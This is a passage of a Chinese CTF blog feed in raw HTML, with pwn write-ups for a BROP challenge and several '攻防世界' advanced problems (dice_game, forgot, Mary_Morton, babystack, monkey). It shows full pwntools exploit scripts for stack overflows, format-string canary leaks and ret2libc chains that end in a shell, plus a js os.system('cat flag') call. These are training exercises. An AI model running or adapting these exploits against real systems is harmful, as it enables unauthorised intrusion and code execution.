class="line">        <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'success brop gadget: 0x%x'</span> % addr</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\x7fELF</p><p>4.所以我们可以接着去找put函数的地址即put@plt</p><p>我们找到的gadget为libc_csu_init中的可以操作6个寄存器的</p><p>所以我们可以使用pop_rdi = brop_add + 9来获得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'A'</span>*<span class="number">72</span> +p64(pop_rdi_ret)+p64(<span class="number">0x400000</span>)+p64(addr)+p64(stop_gadget)</span><br></pre></td></tr></table></figure><p>具体函数:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_addr</span><span class="params">(length, rdi_ret, stop_gadget)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(addr)</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'A'</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(</span><br><span class="line">            addr) + p64(stop_gadget)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">'\x7fELF'</span>):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'find puts@plt addr: 0x%x'</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure><p>5.寻找put@got</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(length, rdi_ret, puts_plt, leak_addr, stop_gadget)</span>:</span></span><br><span class="line">    sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">    payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class="line">        puts_plt) + p64(stop_gadget)</span><br><span class="line">    sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data[:data.index(<span class="string">"\nWelCome"</span>)]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = data</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">""</span>:</span><br><span class="line">            data = <span class="string">'\x00'</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">    <span class="keyword">print</span> hex(addr)</span><br><span class="line">    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += data</span><br><span class="line">    addr += len(data)  <span class="comment">#这里的len(data)若为\x00则为1，没毛病。若不为\x00为其他字节，因为一个地址对应一个储存单元对应一字节，而且len(data)为字节数，所以输入多少个字节就往后移动多少字节就ok</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'code'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure><p>可以根据输出的数据转化为汇编来看plt表中的got地址</p><p>之后在通过put@plt泄露出puts@got中的内容（即libc中的地址）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line"><span class="comment">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(</span><br><span class="line">    stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(<span class="string">'\nWelCome'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(binsh_addr) + p64(</span><br><span class="line">    system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界进阶区</title>
      <link href="/2020/01/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6%E5%8C%BA/"/>
      <url>/2020/01/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界进阶区"><a href="#攻防世界进阶区" class="headerlink" title="攻防世界进阶区"></a>攻防世界进阶区</h1><a id="more"></a><h2 id="1-dice-game"><a href="#1-dice-game" class="headerlink" title="1. dice _ game"></a>1. dice _ game</h2><p>同新手区的那个随机数问题</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./dice_game'</span></span><br><span class="line">libc_name = <span class="string">'./libc.so.6'</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'43605'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Welcome, let me know your name: "</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x40</span>) + p64(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">p.sendlineafter(<span class="string">"Give me the point(1~6): "</span>,str(libc.rand()%<span class="number">6</span> + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure><h2 id="2-forgot"><a href="#2-forgot" class="headerlink" title="2.forgot"></a>2.forgot</h2><p>使用@字符绕过下面的嵌套着swich语句的for循环</p><p>使得v14一直为1</p><p>从而使后面的调用函数的地址一直是v3的值</p><p>我们只需栈溢出覆盖v3的值为危险函数地址就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'59557'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x80486cc</span></span><br><span class="line">payload = <span class="string">"@"</span> * <span class="number">32</span> + p32(system)</span><br><span class="line">payload1 = <span class="string">"summerN"</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"a"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,payload)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure><h2 id="3-warmup"><a href="#3-warmup" class="headerlink" title="3.warmup"></a>3.warmup</h2><h5 id="先看一下sprintf"><a href="#先看一下sprintf" class="headerlink" title="先看一下sprintf()"></a>先看一下sprintf()</h5><p>sprintf指的是字符串格式化命令，函数声明为 int sprintf(char *string, char *format<br>[,argument,…]);，主要功能是把格式化的数据写入某个字符串中，即发送格式化输出到 string 所指向的字符串。sprintf<br>是个<a href="https://baike.baidu.com/item/变参/9844833" target="_blank" rel="noopener">变参</a>函数。使用sprintf 对于写入buffer的字符数是没有限制的，这就存在了buffer溢出的可能性。解决这个问题，可以考虑使用 <a href="https://baike.baidu.com/item/snprintf" target="_blank" rel="noopener">snprintf</a>函数，该函数可对写入字符数做出限制。</p><p>题目直接通过sprintf函数泄露出了危险函数地址</p><p>exp:</p><h2 id="4-Mary-Morton"><a href="#4-Mary-Morton" class="headerlink" title="4.Mary_Morton"></a>4.Mary_Morton</h2><p>步骤：</p><p>1.通过格式化字符串漏洞泄露cannary</p><p>2.绕过cannary执行危险函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'57071'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p=process(file_name)</span></span><br><span class="line">p=remote(ip,port)</span><br><span class="line">alarm_add = <span class="number">0x4008DA</span></span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">offset1 = offset + (<span class="number">0x90</span><span class="number">-8</span>)/<span class="number">8</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"3. Exit the battle \n"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">payload = <span class="string">"%23$p"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">cann = int(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> cann</span><br><span class="line">p.recvuntil(<span class="string">"3. Exit the battle \n"</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span>*(<span class="number">0x88</span>) + p64(cann) + p64(<span class="number">1</span>) + p64(<span class="number">0x4008DA</span>)  <span class="comment">#p64里面不能有字符串</span></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="5-pwn1"><a href="#5-pwn1" class="headerlink" title="5.pwn1"></a>5.pwn1</h2><p>这个题的思路：</p><p>1.通过自带的puts函数泄露cannary</p><p>2.构造简单的rop泄露libc版本与基地址</p><p>3.拿到shell</p><p>注意：</p><p>本题中，如果想执行我们覆盖掉的返回地址，必须使程序结束，即s=3</p><p>因为我们覆盖的是main函数的返回地址，如果一直进行while循环的话是不可能进行return的</p><p>上exp：</p><p>别看exp很长，因为我走了很多弯路，其实exp很简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./babystack'</span></span><br><span class="line">libc_name = <span class="string">'./libc-2.23.so'</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'45399'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400a93</span></span><br><span class="line">main_addr = <span class="number">0x400908</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(puts_plt)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">payload1 = <span class="string">"a"</span> * (<span class="number">0x90</span><span class="number">-8</span>) + <span class="string">"a"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span> * (<span class="number">0x90</span> <span class="number">-7</span>))</span><br><span class="line"><span class="comment">#print u64(p.recv(7).strip("\n").rjust(8,"\x00"))</span></span><br><span class="line">cannary = hex(u64(p.recv(<span class="number">7</span>).strip(<span class="string">"\n"</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>)))</span><br><span class="line"><span class="comment">#print p.recvline().strip("\n").ljust(8,"\x00") </span></span><br><span class="line"><span class="keyword">print</span> cannary</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p.recvuntil("&gt;&gt; ")</span></span><br><span class="line"><span class="string">#payload2 = "a" * (0x90-8) + p64(int(cannary,16)) + "b" * 8 + </span></span><br><span class="line"><span class="string">payload2 = p64(puts_got)</span></span><br><span class="line"><span class="string">p.sendline("1")</span></span><br><span class="line"><span class="string">p.send(payload2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.recvuntil("&gt;&gt; ")</span></span><br><span class="line"><span class="string">p.sendline("2")</span></span><br><span class="line"><span class="string">start_add = u64(p.recv().ljust(8,"\x00"))</span></span><br><span class="line"><span class="string">print hex(start_add)</span></span><br><span class="line"><span class="string">base_add = start_add - libc.symbols['__libc_start_main']</span></span><br><span class="line"><span class="string">print hex(libc.symbols['__libc_start_main'])</span></span><br><span class="line"><span class="string">print hex(base_add)</span></span><br><span class="line"><span class="string">sys_add = base_add + libc.symbols['system']</span></span><br><span class="line"><span class="string">bin_add = base_add + libc.search("/bin/sh\x00").next()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x88</span>+p64(int(cannary,<span class="number">16</span>))+<span class="string">'a'</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">start_add = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,start_add)</span><br><span class="line">libc_add = start_add - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line"><span class="comment">#print start_add</span></span><br><span class="line"><span class="comment">#base_add = start_add - libc.symbols['puts']</span></span><br><span class="line"><span class="comment">#print hex(libc.symbols['puts'])</span></span><br><span class="line"><span class="comment">#print hex(base_add)</span></span><br><span class="line">sys_add = libc_add + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_add = libc_add + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">payload3 = <span class="string">"a"</span> * (<span class="number">0x90</span><span class="number">-8</span>) + p64(int(cannary,<span class="number">16</span>)) + p64(<span class="number">1</span>) + p64(pop_rdi) + p64(bin_add) + p64(sys_add)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="6-monkey"><a href="#6-monkey" class="headerlink" title="6.monkey"></a>6.monkey</h2><p>64位程序</p><p>从来没遇见过引入js库的pwn题</p><p>引入了js，估计就是个js语言解释器</p><p>注意：</p><p>1.这道题目多了几个动态链接库，我先说明一下怎么在python+pwn中使用动态链接库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = process([process_name], env=&#123;<span class="string">'LD_LIBRARY_PATH'</span>:<span class="string">'./'</span>&#125;)</span><br></pre></td></tr></table></figure><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(&#39;js&gt;&#39;,&#39;os.system(\&#39;cat flag\&#39;)&#39;)</span><br></pre></td></tr></table></figure><p>这里我们需要在后面加上\进行转移</p><p>或者将里面的单引号转变为双引号</p><p>我们发现我们输入的js函数会执行，因此上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file_name = <span class="string">'./js'</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'42533'</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"><span class="comment">#p = process([file_name], env=&#123;'LD_LIBRARY_PATH':'./'&#125;) #在本地中使用动态库</span></span><br><span class="line">p.sendlineafter(<span class="string">'js&gt;'</span>,<span class="string">'os.system(\'cat flag\')'</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="7-stack2"><a href="#7-stack2" class="headerlink" title="7.stack2"></a>7.stack2</h2><p>32位程序</p><p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579109262215.png" alt="1579109262215"></p><p>我们现在v13处下断点</p><p>之后再在return 0 处下断点</p><p>这样的话可以让我们找到输入数字的栈地址，更改时的栈地址，以及在跳入return 0 之前以及执行ret汇编指令之前的变化情况从而获取偏移量</p><p><img src="https://i.loli.net/2020/01/16/H36M18FjuCIB5aL.png" alt="QQ截图20200116012503.png"></p><p><img src="https://i.loli.net/2020/01/16/OdYxFgqyhQHGC3u.png" alt="QQ截图20200116012525.png"></p><p><img src="https://i.loli.net/2020/01/16/LAlWa5o6DPdmi7U.png" alt="QQ截图20200116012517.png"></p><p><img src="https://i.loli.net/2020/01/16/Uuy5hGgpbd2eozr.png" alt="QQ截图20200116012513.png"></p><p>改变了v13[1]</p><p><a href="https://blog.csdn.net/xi_niuniu/article/details/44978207" target="_blank" rel="noopener">https://blog.csdn.net/xi_niuniu/article/details/44978207</a></p><p>ret 可以理解为pop eip</p><p>那么我们在还没有执行ret的时候</p><p>eip指向的为返回地址，而此时还没有pop eip</p><p>所以现在esp指向的栈地址即为返回地址所在的位置，也就是我们想要的偏移地址最低位字节的地址</p><p>通过这个我们可以计算offset 